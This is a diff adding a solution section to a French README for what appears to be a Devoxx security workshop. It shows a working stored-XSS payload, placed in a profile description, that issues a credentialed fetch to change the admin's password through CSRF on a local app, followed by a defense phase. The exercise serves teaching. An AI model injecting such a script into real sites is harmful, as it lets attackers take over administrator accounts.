@@ -95,3 +95,42 @@ quarkus.hibernate-orm.database.generation=update
 - Vous devez tout d'abord chercher la faille XSS, dans cet exercice vous devez alterner entre la position d'attaquant et la position de l'admin de l'autre, c'est un genre de jeu de rôle
 - Une fois la faille XSS trouvée, exploitez-la pour modifier le mot de passe de l'admin via une faille CSRF
 - Vous allez enfin vous connecter en tant qu'administrateur avec le nouveau mot de passe
+
+### Solution
+
+- Vous créez un compte d'attaque
+- Vous vous logguez
+- Vous lancez la modification de votre mot de passe afin de voir quelle requête est lancée => c'est cette requête qu'il faut faire lancer par l'admin via une attaque CSRF en utilisant son cookie
+- Afin de pouvoir faire exécuter la requête par l'admin, vous allez modifier votre description pour inclure du code javascript (et ainsi exploiter une faille XSS) qui va lancer cette requête via fetch
+- Lorsque l'admin ira voir la page "les utilisateurs de l'application devoxx", la requête javascript sera exécutée, en utilisant son cookie, et son mot de passe sera changé automatiquement
+- La description peut-être modifiée comme ceci :
+
+```
+<script>
+fetch("http://localhost:8081/users/myprofile", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
+        "Accept": "*/*",
+        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Content-Type": "application/json",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-GPC": "1"
+    },
+    "referrer": "http://localhost:8081/",
+    "body": "{\"nickname\":\"admin\",\"firstName\":\"\",\"name\":\"\",\"email\":\"admin@devoxx.com\",\"desc\":\"\",\"password\":\"devoxxnew\",\"acceptNewsletter\":true}",
+    "method": "POST",
+    "mode": "cors"
+});
+</script>
+```
+
+- Puis vous jouer le rôle de l'admin qui se connecte et qui se rend sur la page "les utilisateurs de l'application devoxx" via le bouton "Voir les utilisateurs"
+- Son mot de passe vient d'être modifié
+- Vous pouvez ensuite vous connecter en tant qu'administrateur
+
+## Phase de défense
+
+- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !
